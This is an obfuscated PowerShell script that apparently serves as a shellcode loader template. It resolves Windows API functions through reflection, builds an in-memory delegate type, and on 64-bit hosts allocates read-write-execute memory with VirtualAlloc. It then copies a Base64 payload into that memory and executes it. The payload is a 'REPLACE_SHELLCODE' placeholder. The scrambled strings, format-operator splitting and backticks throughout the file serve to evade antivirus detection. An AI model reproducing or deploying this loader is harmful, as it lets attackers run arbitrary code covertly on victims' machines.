$91oWhz =  [tYPE]("{0}{1}{2}"-f 'App','Doma','in') ;  $9t8Q7A=[TYpE]("{2}{5}{1}{0}{7}{9}{4}{3}{8}{10}{6}" -f'CTiON','reFle','SysT','lybUi','MB','Em.','Ccess','.emIt.As','LDeR','se','a') ;   set ("1"+"GFT9"+"b") (  [tYPe]("{8}{3}{7}{2}{6}{0}{5}{1}{4}{9}{10}"-F'A','ti','CTion.','eM.r','O','lLinGcONven','c','Efle','sYST','n','S')); SeT-Item  varIaBLE:5YVUc  ( [TYpE]("{4}{1}{0}{2}{3}" -F '.cO','ysTEM','nve','RT','s'))  ;   $g1iJ7  =  [tYpe]("{3}{8}{0}{4}{2}{5}{7}{1}{6}" -F 'em.run','vIcEs.MaRsh','TER','s','tIme.In','OPSe','AL','R','Yst') ;   sEt-item Variable:q0uXT  ( [TypE]("{0}{1}" -F 'Int','PtR')  )  ;.("{0}{2}{1}"-f'Set','rictMode','-St') -Version 2

function FU`NC_gET_p`ROC_`ADDREsS {
        Param (${Va`R`_MOduLe}, ${var`_P`RoCed`UrE})
        ${V`AR_u`Ns`AFe_N`AtiVe`_mEthODs} = (  (Get-variaBLe  91owHZ)."vAL`UE"::"CUrrenTd`O`M`AiN".("{3}{2}{1}{0}" -f 'lies','Assemb','t','Ge').Invoke() | &("{3}{1}{2}{0}"-f 'ect','re','-Obj','Whe') { ${_}."GlOBA`l`A`Ss`EMbl`YcaChE" -And ${_}."l`Oc`ATioN".("{1}{0}"-f 'it','Spl').Invoke('\\')[-1].("{1}{0}{2}"-f'a','Equ','ls').Invoke(("{1}{2}{0}" -f'm.dll','Syst','e')) }).("{0}{1}" -f 'G','etType').Invoke(("{0}{4}{8}{6}{1}{3}{7}{2}{5}" -f'Microso','2.U','tiveMet','n','ft.','hods','in3','safeNa','W'))
        ${vaR`_`gPa} = ${V`AR_`UNs`AfE`_`NAtI`VE_`mEthODS}.("{1}{2}{0}" -f 'hod','G','etMet').Invoke(("{3}{0}{2}{1}" -f'cA','ss','ddre','GetPro'), [Type[]] @(("{5}{6}{8}{4}{7}{0}{3}{1}{2}" -f'opServi','Han','dleRef','ces.','nte','System.Runtime','.','r','I'), ("{1}{2}{0}" -f 'ng','s','tri')))
        return ${V`A`R_gPa}."iN`VO`Ke"(${n`UlL}, @([System.Runtime.InteropServices.HandleRef](.("{1}{0}{3}{2}" -f'w-','Ne','ct','Obje') ("{1}{3}{5}{2}{0}{6}{4}"-f'ervices.Handl','S','ropS','ystem','Ref','.Runtime.Inte','e')((.("{2}{0}{1}{3}" -f'ew-O','bjec','N','t') ("{1}{0}{2}"-f 'nt','I','Ptr')), (${vaR_`Unsaf`E_N`AtIVE_met`HOds}.("{2}{0}{1}" -f 'o','d','GetMeth').Invoke(("{3}{4}{1}{0}{2}" -f 'l','eHand','e','Get','Modul')))."InV`oKe"(${n`UlL}, @(${Va`R_MoD`ULE})))), ${vAr_pR`oCeD`U`RE}))
}

function FUN`C`_geT_`d`eLEgAte_typE {
        Param (
                [Parameter(posItiOn = 0, MaNdatory = ${t`RuE})] [Type[]] ${vA`R_param`ET`ERS},
                [Parameter(PosiTIon = 1)] [Type] ${Var_`Ret`U`RN_TyPe} = [Void]
        )

        ${vA`R_tYpe_bU`i`Ld`Er} =   $91OwHZ::"cur`REn`TDom`AIN".("{0}{4}{1}{2}{3}{5}"-f'De','ineD','ynami','c','f','Assembly').Invoke((.("{1}{0}{2}{3}"-f'-','New','Obje','ct') ("{5}{1}{2}{3}{4}{7}{6}{0}" -f 'lyName','tem.R','eflec','tion.As','se','Sys','b','m')(("{3}{1}{0}{4}{2}"-f 'ct','le','dDelegate','Ref','e'))),   $9t8q7a::"R`UN").("{0}{3}{4}{5}{2}{1}"-f'Defi','e','micModul','neD','yn','a').Invoke(("{1}{2}{0}"-f 'e','InMem','oryModul'), ${faL`SE}).("{0}{1}{2}"-f 'Defi','neTy','pe').Invoke(("{0}{3}{2}{1}" -f'M','eType','at','yDeleg'), ("{0}{6}{4}{2}{1}{5}{9}{3}{7}{8}" -f 'Class, ','ealed','blic, S','Class, Auto','u',', ','P','Clas','s','Ansi'), [System.MulticastDelegate])
        ${Var_`TYpE_`Bu`iLdeR}.("{0}{1}{2}{3}" -f'Defin','eCo','nst','ructor').Invoke(("{1}{5}{6}{2}{4}{0}{8}{7}{3}{9}"-f'deByS','RT','alNa','u','me, Hi','Sp','eci','g, P','i','blic'),   (  Gci ('V'+'ar'+'iaBLe:1'+'GfT9B')  )."VA`Lue"::"StAn`d`ARd", ${VA`R`_`pARa`Meters}).("{3}{4}{1}{0}{2}"-f 'ionFla','mplementat','gs','S','etI').Invoke(("{2}{3}{0}{1}"-f 'a','naged','Runtime,',' M'))
        ${V`AR_type_`BU`iLd`Er}.("{2}{1}{0}"-f'Method','fine','De').Invoke('Invoke', ("{1}{0}{9}{7}{5}{6}{8}{4}{3}{2}" -f'l','Pub','al','Virtu','ot, ','ideB','ySig, ',', H','NewSl','ic'), ${VaR_`RET`U`Rn_t`ypE}, ${VA`R_P`A`RAmeT`ers}).("{4}{3}{2}{0}{5}{1}" -f'ti','lags','a','Implement','Set','onF').Invoke(("{2}{1}{0}{3}" -f'Manag',', ','Runtime','ed'))

        return ${V`AR_t`ypE_buiLd`ER}.("{0}{1}{2}" -f'Crea','teTyp','e').Invoke()
}

If (  (LS ("VARIabl"+"e:"+"Q0"+"Ux"+"T") )."VaL`Ue"::"si`ZE" -eq 8) {
        [Byte[]]${VaR`_cO`De} =   ( vAriAblE  5yvuc -vALUeONLy )::("{0}{1}{2}"-f 'F','rom','Base64String').Invoke('REPLACE_SHELLCODE')

        ${VA`R`_va} =  $G1iJ7::("{4}{5}{7}{3}{1}{6}{2}{0}" -f'r','tionPoin','e','c','Ge','tDelega','t','teForFun').Invoke((.("{3}{4}{0}{2}{1}"-f'roc','s','_addres','f','unc_get_p') ("{1}{3}{2}{0}"-f '32.dll','k','l','erne') ("{1}{0}{2}"-f'll','VirtualA','oc')), (&("{4}{1}{3}{2}{0}"-f'e_type','unc_get_','gat','dele','f') @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
        ${v`AR`_BUfFeR} = ${var`_`Va}."Inv`oKe"(  $q0uxT::"Z`ERO", ${Var_`cO`De}."l`e`NGTh", 0x3000, 0x40)
         $G1ij7::("{1}{0}" -f'py','Co').Invoke(${v`AR_`cOde}, 0, ${vaR_B`UfF`Er}, ${vaR_cO`DE}."L`eNg`TH")

        ${v`A`R`_Runme} =   ( vAriabLe  ('g1'+'iJ7'))."vA`lue"::("{2}{3}{0}{4}{1}" -f 'egateForFunctio','r','Ge','tDel','nPointe').Invoke(${VA`R_b`UFFER}, (&("{3}{1}{0}{4}{2}" -f 'egat','nc_get_del','e','fu','e_typ') @([IntPtr]) ([Void])))
        ${va`R_RU`N`me}."iNvo`KE"(  (GEt-VARIabLE Q0uxT  -vAlue  )::"z`eRo")
}